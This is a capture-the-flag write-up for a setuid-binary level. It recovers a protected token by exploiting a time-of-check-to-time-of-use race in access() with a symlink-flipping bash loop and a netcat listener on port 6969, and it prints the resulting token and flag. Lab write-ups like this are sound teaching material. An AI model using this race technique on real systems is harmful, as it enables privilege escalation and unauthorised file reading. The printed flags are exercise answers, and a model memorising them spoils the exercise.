In this level, we have 2 files : `level10`, a setuid executable, and `token`, a
regular file with no permissions.

`./level10`
>./level10 file host   
    sends file to host if you have access to it

`./level10 token` gives the same output.

If we `strings level10`, we can find this : 

```
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
```

We understand that `level10` is a script to send a file to a host on
port 6969.

We open a 2nd instance of terminal, in order to listen to port 6969 in the
second window, and send the file in the 1st instance. But this doesn't work.

If we `nm-u level10` : 
```
         w _Jv_RegisterClasses
         U __errno_location@@GLIBC_2.0
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
```

We found out that `access` function has a security hole which can be exploited
with a toctou race condition. We also learn that `access` dereferences a symlink
when it is giving one. Meaning that `access` check the permissions of the file the
symlink points to, and not the permissions of the symlink itself.

So, what we need to do, is to create a symlink that alternatively points on
`level10`, and on a file we have access to, and in the same time try to send
the symlink to `localhost`. We put everything in a loop, in a
script :

toctou.sh :

```
#!/bin/bash

while true
do
	ln -fs /tmp/toto /tmp/sym &
	./level10 /tmp/sym 127.0.0.1 & 
	ln -fs /home/user/level10/token /tmp/sym &
done
```

In the same time, we listen to the port in another instance of terminal :

`while true; do nc -l 6969;  done`

We got this in the listening terminal :

```
.*( )*.
woupa2yuojeeaaed06riuj63c
```

`su flag10` and `getflag` :
> Check flag.Here is your token : feulo4b72j7edeahuete3no7c


# Sources :

127.0.0.1 IP address explained :
- https://www.lifewire.com/network-computer-special-ip-address-818385

Listening and sending data to a specific port : 
- https://askubuntu.com/questions/509629/sending-data-to-port-does-not-seem-to-be-working-on-ubuntu-linux

man access page containing warning about a security hole : 
- https://linux.die.net/man/2/access
- https://stackoverflow.com/questions/7925177/access-security-hole

About the "&" at the end of a linux command : 
- https://stackoverflow.com/questions/13338870/what-does-at-the-end-of-a-linux-command-mean

How to exploit `access` with symlinks : 
- https://labs.p64cyber.com/exploit-access-with-symlinks/

How to change where a symlink points :
- https://unix.stackexchange.com/questions/151999/how-to-change-where-a-symlink-points

About `toctou` (time-of-check to time-to-user) race condition : 
- https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use